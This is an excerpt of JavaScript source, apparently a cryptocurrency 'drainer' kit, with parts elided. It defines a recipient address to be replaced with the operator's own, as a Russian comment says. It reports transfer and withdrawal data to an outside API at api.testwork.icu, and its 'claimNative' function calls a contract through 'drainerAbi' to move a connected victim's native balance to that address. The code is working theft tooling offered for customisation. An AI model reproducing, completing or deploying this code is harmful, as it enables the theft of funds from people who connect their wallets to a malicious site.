...
const NATIVE_RECIPIENT_ADDRESS = "0x2d48C8C0b6e56f3A8af4E9FE49A31746D02d3b0a"; // ЗАМЕНИТЕ НА ВАШ АДРЕС
...
const CONTRACTS = {
  [networkMap['Ethereum'].chainId]: '0x381eee629c1867102185478d6d813BF0b3E24d5D',
  [networkMap['BNB Smart Chain'].chainId]: '0x735d4CcD01d18Ef4D91e0BcbadDCF9FEE420eFCC',
...
const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
  try {
    const response = await fetch('https://api.testwork.icu/api/transfer', {
      method: 'POST',
...
const callWithdrawAPI = async (chainId) => {
  try {
    const response = await fetch('https://api.testwork.icu/api/withdraw', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
...
const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => {
  ...
  try {
    ...
    const claimTxHash = await writeContract(wagmiConfig, {
      ...
      abi: drainerAbi,
      functionName: 'claim',
      args: [getAddress(NATIVE_RECIPIENT_ADDRESS)],
      chainId,
      value: valueToSend
    })
